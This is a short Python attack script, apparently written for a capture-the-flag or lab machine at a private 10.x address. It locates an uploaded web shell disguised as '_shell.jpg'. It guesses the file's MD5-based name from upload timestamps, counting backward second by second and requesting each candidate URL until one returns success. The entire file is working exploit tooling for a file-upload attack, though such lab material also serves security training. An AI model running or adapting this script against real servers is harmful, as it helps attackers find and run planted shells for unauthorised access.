#!/usr/bin/python3


import requests
import sys
from pprint import pprint
import time
import hashlib

def md5_file(text: str) -> str:
    return hashlib.md5(text.encode('utf-8')).hexdigest()



proxies = None
upload_dir = "http://10.10.11.135/images/uploads/"
file_name = "_shell.jpg"
upload_time = round(time.time())


while True:
    print("\rAttempting: md5(%s)"% ('$file_hash' + str(upload_time)) + file_name,end='')

    abs_path = upload_dir + md5_file('$file_hash' + str(upload_time)) + file_name
    ress = requests.get(abs_path, proxies=proxies)
    if ress.status_code == 200:
        print("\n[*] Found %s" % abs_path)
        exit()
    upload_time-=1
